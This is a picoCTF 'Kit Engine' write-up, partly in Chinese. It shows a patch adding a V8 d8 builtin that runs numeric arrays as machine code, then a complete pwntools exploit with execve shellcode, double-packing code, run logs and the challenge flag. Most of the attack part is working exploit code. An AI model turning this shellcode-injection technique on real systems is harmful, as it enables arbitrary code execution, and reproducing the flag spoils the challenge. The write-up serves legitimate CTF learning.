---
title: PicoCTF - Kit Engine
tags: [PicoCTF, CTF, PWN]

---

# PicoCTF - Kit Engine
## Background
[Google V8 Engine](https://ithelp.ithome.com.tw/articles/10216397)
> V8 引擎是 Google 做出來讓 JS 跟瀏覽器溝通的的開源專案，這個引擎被使用的非常廣泛，在 Chrome 瀏覽器跟 Node.js ，以及桌面應用程式框架 Electron 之中都有他的身影。而在 V8 出現前，最早最早的 JavaScript 引擎，叫做 SpiderMonkey ，同時也是另一個知名瀏覽器 FireFox 的渲染引擎。

[Using d8](https://v8.dev/docs/d8)
> d8 is V8’s own developer shell.
>
> d8 is useful for running some JavaScript locally or debugging changes you have made to V8. Building V8 using GN for x64 outputs a d8 binary in out.gn/x64.optdebug/d8. You can call d8 with the --help argument for more information about usage and flags.

[Convert Bytes to Floating Point Numbers?](https://stackoverflow.com/questions/5415/convert-bytes-to-floating-point-numbers)
> ```python
> >>> import struct
> >>> struct.pack('f', 3.141592654)
> b'\xdb\x0fI@'
> >>> struct.unpack('f', b'\xdb\x0fI@')
> (3.1415927410125732,)
> >>> struct.pack('4f', 1.0, 2.0, 3.0, 4.0)
> '\x00\x00\x80?\x00\x00\x00@\x00\x00@@\x00\x00\x80@'
> ```

## Source code
:::spoiler Patch
```
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index e6fb20d152..35195b9261 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -979,6 +979,53 @@ struct ModuleResolutionData {
 
 }  // namespace
 
+uint64_t doubleToUint64_t(double d){
+  union {
+    double d;
+    uint64_t u;
+  } conv = { .d = d };
+  return conv.u;
+}
+
+void Shell::Breakpoint(const v8::FunctionCallbackInfo<v8::Value>& args) {
+  __asm__("int3");
+}
+
+void Shell::AssembleEngine(const v8::FunctionCallbackInfo<v8::Value>& args) {
+  Isolate* isolate = args.GetIsolate();
+  if(args.Length() != 1) {
+    return;
+  }
+
+  double *func = (double *)mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (func == (double *)-1) {
+    printf("Unable to allocate memory. Contact admin\n");
+    return;
+  }
+
+  if (args[0]->IsArray()) {
+    Local<Array> arr = args[0].As<Array>();
+
+    Local<Value> element;
+    for (uint32_t i = 0; i < arr->Length(); i++) {
+      if (arr->Get(isolate->GetCurrentContext(), i).ToLocal(&element) && element->IsNumber()) {
+        Local<Number> val = element.As<Number>();
+        func[i] = val->Value();
+      }
+    }
+
+    printf("Memory Dump. Watch your endianness!!:\n");
+    for (uint32_t i = 0; i < arr->Length(); i++) {
+      printf("%d: float %f hex %lx\n", i, func[i], doubleToUint64_t(func[i]));
+    }
+
+    printf("Starting your engine!!\n");
+    void (*foo)() = (void(*)())func;
+    foo();
+  }
+  printf("Done\n");
+}
+
 void Shell::ModuleResolutionSuccessCallback(
     const FunctionCallbackInfo<Value>& info) {
   std::unique_ptr<ModuleResolutionData> module_resolution_data(
@@ -2201,40 +2248,15 @@ Local<String> Shell::Stringify(Isolate* isolate, Local<Value> value) {
 
 Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
-                       String::NewFromUtf8Literal(isolate, "global"));
+  // Add challenge builtin, and remove some unintented solutions
+  global_template->Set(isolate, "AssembleEngine", FunctionTemplate::New(isolate, AssembleEngine));
+  global_template->Set(isolate, "Breakpoint", FunctionTemplate::New(isolate, Breakpoint));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
-
   global_template->Set(isolate, "print", FunctionTemplate::New(isolate, Print));
-  global_template->Set(isolate, "printErr",
-                       FunctionTemplate::New(isolate, PrintErr));
-  global_template->Set(isolate, "write", FunctionTemplate::New(isolate, Write));
-  global_template->Set(isolate, "read", FunctionTemplate::New(isolate, Read));
-  global_template->Set(isolate, "readbuffer",
-                       FunctionTemplate::New(isolate, ReadBuffer));
-  global_template->Set(isolate, "readline",
-                       FunctionTemplate::New(isolate, ReadLine));
-  global_template->Set(isolate, "load", FunctionTemplate::New(isolate, Load));
-  global_template->Set(isolate, "setTimeout",
-                       FunctionTemplate::New(isolate, SetTimeout));
-  // Some Emscripten-generated code tries to call 'quit', which in turn would
-  // call C's exit(). This would lead to memory leaks, because there is no way
-  // we can terminate cleanly then, so we need a way to hide 'quit'.
   if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
-  global_template->Set(isolate, "testRunner",
-                       Shell::CreateTestRunnerTemplate(isolate));
-  global_template->Set(isolate, "Realm", Shell::CreateRealmTemplate(isolate));
-  global_template->Set(isolate, "performance",
-                       Shell::CreatePerformanceTemplate(isolate));
-  global_template->Set(isolate, "Worker", Shell::CreateWorkerTemplate(isolate));
-  // Prevent fuzzers from creating side effects.
-  if (!i::FLAG_fuzzing) {
-    global_template->Set(isolate, "os", Shell::CreateOSTemplate(isolate));
-  }
-  global_template->Set(isolate, "d8", Shell::CreateD8Template(isolate));
 
 #ifdef V8_FUZZILLI
   global_template->Set(
@@ -2243,11 +2265,6 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
       FunctionTemplate::New(isolate, Fuzzilli), PropertyAttribute::DontEnum);
 #endif  // V8_FUZZILLI
 
-  if (i::FLAG_expose_async_hooks) {
-    global_template->Set(isolate, "async_hooks",
-                         Shell::CreateAsyncHookTemplate(isolate));
-  }
-
   return global_template;
 }
 
@@ -2449,10 +2466,10 @@ void Shell::Initialize(Isolate* isolate, D8Console* console,
             v8::Isolate::kMessageLog);
   }
 
-  isolate->SetHostImportModuleDynamicallyCallback(
+  /*isolate->SetHostImportModuleDynamicallyCallback(
       Shell::HostImportModuleDynamically);
   isolate->SetHostInitializeImportMetaObjectCallback(
-      Shell::HostInitializeImportMetaObject);
+      Shell::HostInitializeImportMetaObject);*/
 
 #ifdef V8_FUZZILLI
   // Let the parent process (Fuzzilli) know we are ready.
diff --git a/src/d8/d8.h b/src/d8/d8.h
index a6a1037cff..4591d27f65 100644
--- a/src/d8/d8.h
+++ b/src/d8/d8.h
@@ -413,6 +413,9 @@ class Shell : public i::AllStatic {
     kNoProcessMessageQueue = false
   };
 
+  static void AssembleEngine(const v8::FunctionCallbackInfo<v8::Value>& args);
+  static void Breakpoint(const v8::FunctionCallbackInfo<v8::Value>& args);
+
   static bool ExecuteString(Isolate* isolate, Local<String> source,
                             Local<Value> name, PrintResult print_result,
                             ReportExceptions report_exceptions,
```
:::
## Recon
這一題很有趣，不過我原本不知道v8或d8是啥東東，以為是類似老舊攝影機???但看了[^pico_pwn_kit_engine_nickchen][^pico_pwn_kit_engine_maple]的WP，發現沒有想像中的複雜，首先他給了一個d8(也就是local端可以使用的v8，類似psysh的感覺，可以執行js的環境)，然後他有給一個patch，所以不用管其他的部分，只要專注在他patch的內容即可。

1. diff
從patch file可以看得出來他新實作了三個function: `uint64_t doubleToUint64_t(double d)`, `void Shell::Breakpoint(const v8::FunctionCallbackInfo<v8::Value>& args)`, `void Shell::AssembleEngine(const v8::FunctionCallbackInfo<v8::Value>& args)`，其中`Breakpoint`和`AssembleEngine`都是繼承Shell class，然後`AssembleEngine`需要傳入args的參數
2. Analyze `AssembleEngine` Function
在patch的33行中，會判斷傳入的args是不是array，然後array中每一個element都要是number，接著就會把value放到前面定義的func(其實就是function pointer)，再後面的for loop做的事情是把func中每一個element轉data type，從double轉成unsinged integer 64，接著就直接call這個function
3. Construct Payload
基於以上觀察，我們知道`AssembleEngine`可以直接執行我們給他的shellcode，只不過需要花心思在他的data type檢查，也就是args需要是array，且每一個element都必須是double才行

## Exploit - Build Shell Code & Transfer Data Type
```python=
from pwn import *
import struct

context.arch = 'amd64'

if args.REMOTE:
    ls = asm(shellcraft.execve(b"/bin/ls", ["ls"]))
    cat = asm(shellcraft.execve(b"/bin/cat", ["cat", "flag.txt"]))
    r = remote('mercury.picoctf.net', 48700)
else:
    ls = b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.cho.mr\x01H1\x04$H\x89\xe7hmr\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
    cat = b'j\x01\xfe\x0c$H\xb8/bin/catPH\x89\xe7h.txtH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8b`u\x01gm`fH1\x04$1\xf6Vj\x0c^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
    r = process(['python', 'server.py'])
log.info(f'ls shellcode: {ls}')
log.info(f'cat flag.txt shellcode: {cat}')

def Transfer2DoubleArray(shellcode):
    shell_array = []
    if len(shellcode) % 8 > 0:
        shellcode += (8 - len(shellcode) % 8) * b'\x00'
    for i in range(0, len(shellcode), 8):
        double_tmp = struct.unpack('d', shellcode[i:i+8])[0]
        shell_array.append(double_tmp)
    
    return shell_array



payload = f'AssembleEngine({Transfer2DoubleArray(ls)})'
r.recvuntil(b'Provide size. Must be < 5k:')
r.sendline(str(len(payload)).encode())
r.recvline()
r.sendline(payload.encode())
print(r.recvall().decode())
r.close()

if args.REMOTE:
    r = remote('mercury.picoctf.net', 48700)
else:
    r = process(['python', 'server.py'])
payload = f'AssembleEngine({Transfer2DoubleArray(cat)})'
r.recvuntil(b'Provide size. Must be < 5k:')
r.sendline(str(len(payload)).encode())
r.recvline()
r.sendline(payload.encode())
print(r.recvall().decode())
```
:::spoiler Local Result
```bash
$ python exp.py
[+] Starting local process '/home/sbk6401/anaconda3/envs/CTF/bin/python': pid 19347
[*] ls shellcode: b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.cho.mr\x01H1\x04$H\x89\xe7hmr\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
[*] cat flag.txt shellcode: b'j\x01\xfe\x0c$H\xb8/bin/catPH\x89\xe7h.txtH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8b`u\x01gm`fH1\x04$1\xf6Vj\x0c^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
[+] Receiving all data: Done (334B)
[*] Process '/home/sbk6401/anaconda3/envs/CTF/bin/python' stopped with exit code 0 (pid 19347)
AssembleEngine([7.748604185565308e-304, 7.001521162788231e+194, 1.773290430551938e-288, 1.0748503232447379e-301, 7.748605141607601e-304, 1.776650735790609e-302, 3.6509617888350745e+206, 4.1942076e-316])
File written. Running. Timeout is 20s
Run Complete
Stdout b'd8\nexp-nickchen.py\nexp.py\nflag.txt\nserver.py\nsource\n'
Stderr b''

[+] Starting local process '/home/sbk6401/anaconda3/envs/CTF/bin/python': pid 19366
[+] Receiving all data: Done (340B)
[*] Process '/home/sbk6401/anaconda3/envs/CTF/bin/python' stopped with exit code 0 (pid 19366)
AssembleEngine([8.191473375206089e-79, 3.775826202043335e+79, 1.1205295651588473e+253, 7.748604185565308e-304, 2.460307022775963e+257, 1.7734484618746183e-288, 4.089989556334856e+40, 1.7766596360849696e-302, 3.6509617888350745e+206, 4.1942076e-316])
File written. Running. Timeout is 20s
Run Complete
Stdout b'picoCTF{test_132}'
Stderr b''
```
:::
:::spoiler Remote Result
```bash
$ python exp.py REMOTE
[+] Opening connection to mercury.picoctf.net on port 48700: Done
[*] ls shellcode: b'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.cho.mr\x01H1\x04$H\x89\xe7hmr\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
[*] cat flag.txt shellcode: b'j\x01\xfe\x0c$H\xb8/bin/catPH\x89\xe7h.txtH\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8b`u\x01gm`fH1\x04$1\xf6Vj\x0c^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
[+] Receiving all data: Done (334B)
[*] Closed connection to mercury.picoctf.net port 48700
AssembleEngine([7.748604185565308e-304, 7.001521162788231e+194, 1.773290430551938e-288, 1.0748503232447379e-301, 7.748605141607601e-304, 1.776650735790609e-302, 3.6509617888350745e+206, 4.1942076e-316])
File written. Running. Timeout is 20s
Run Complete
Stdout b'd8\nflag.txt\nserver.py\nsource.tar.gz\nxinet_startup.sh\n'
Stderr b''

[+] Opening connection to mercury.picoctf.net on port 48700: Done
[+] Receiving all data: Done (362B)
[*] Closed connection to mercury.picoctf.net port 48700
AssembleEngine([8.191473375206089e-79, 3.775826202043335e+79, 1.1205295651588473e+253, 7.748604185565308e-304, 2.460307022775963e+257, 1.7734484618746183e-288, 4.089989556334856e+40, 1.7766596360849696e-302, 3.6509617888350745e+206, 4.1942076e-316])
File written. Running. Timeout is 20s
Run Complete
Stdout b'picoCTF{vr00m_vr00m_48f07b402a4020e0}\n'
Stderr b''
```
:::

Flag: `picoCTF{vr00m_vr00m_48f07b402a4020e0}`
## Reference
[^pico_pwn_kit_engine_nickchen]:[V8 exploitation - picoCTF Kit Engine](https://nickchen120235.github.io/2022/04/22/kit-engine.html)
[^pico_pwn_kit_engine_maple]:[Kit Engine - maple](https://blog.maple3142.net/2021/03/30/picoctf-2021-writeups/#kit-engine)